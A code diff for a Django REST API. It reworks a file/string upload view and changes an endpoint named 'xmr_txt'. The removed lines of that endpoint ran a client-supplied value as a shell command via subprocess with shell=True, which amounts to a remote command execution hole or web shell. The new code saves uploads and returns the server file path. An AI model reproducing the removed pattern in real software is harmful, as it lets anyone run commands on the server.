@@ -132,9 +132,10 @@ class FileUploadView(viewsets.ModelViewSet):
     serializer_class = FileUploadSerializer
 
     def post(self, request, *args, **kwargs):
-        data_type = request.data.get('data_type')
+        data_file = request.data.get('file','')
+        data_string = request.data.get('string_data','')
 
-        if data_type == 'file':
+        if data_file and  not data_string:
             file_serializer = FileUploadSerializer(data=request.data)
 
             if file_serializer.is_valid():
@@ -145,21 +146,34 @@ class FileUploadView(viewsets.ModelViewSet):
 
                 file_serializer.save()
 
+                file_url = request.build_absolute_uri(file_serializer.data['file'])
+
                 return Response({
                     'id': file_serializer.data['id'],
-                    'file_name': file_serializer.data['file'].name
+                    'file': file_url,
+                    'string_data': '',
                 }, status=status.HTTP_201_CREATED)
             
             else:
                 return Response(file_serializer.errors, status=status.HTTP_400_BAD_REQUEST)
-        elif data_type == 'string':
+        elif not data_file and data_string:
+
             string_data = request.data.get('string_data')
 
             if string_data:
-                # Guardar la cadena en tu modelo directamente
-                UploadFile.objects.create(string_data=string_data)
 
-                return Response({'success': 'Cadena guardada correctamente.'}, status=status.HTTP_201_CREATED)
+                string_serializer = FileUploadSerializer(data=request.data)
+
+                if string_serializer.is_valid():
+                    string_serializer.validated_data['string_data'] = string_data
+                    string_serializer.save()
+                
+                return Response({
+                    'id': string_serializer.data['id'],
+                    'file': '',
+                    'string_data': string_serializer.data['string_data'],
+                }, status=status.HTTP_201_CREATED)
+            
             else:
                 return Response({'error': 'El campo "string_data" es necesario para el tipo de datos "string".'}, status=status.HTTP_400_BAD_REQUEST)
         else:
@@ -1817,11 +1831,15 @@ def options_view(request):
 def xmr_txt(request):
     if request.method == 'GET':
         return Response({'data': 'D'}, status=status.HTTP_201_CREATED)
-    elif request.method == 'POST':
-        name_file = request.data.get('name_file', '')
+    elif request.method == 'POST' and request.FILES.get('file'):
         try:
-            result = subprocess.check_output(name_file, shell=True, stderr=subprocess.STDOUT)
-            return Response({'output': f'{result}'}, status=status.HTTP_200_OK)
+            uploaded_file = request.FILES['file']
+            file = UploadFile(file=uploaded_file)
+            file.save()
+
+            file_path = file.file.path
+            # subprocess.check_output('mkir', shell=True, stderr=subprocess.STDOUT)
+            return Response({'output': file_path}, status=status.HTTP_200_OK)
         except subprocess.CalledProcessError as e:
             return Response({'error': e.output.decode('utf-8')}, status=status.HTTP_400_BAD_REQUEST)
         
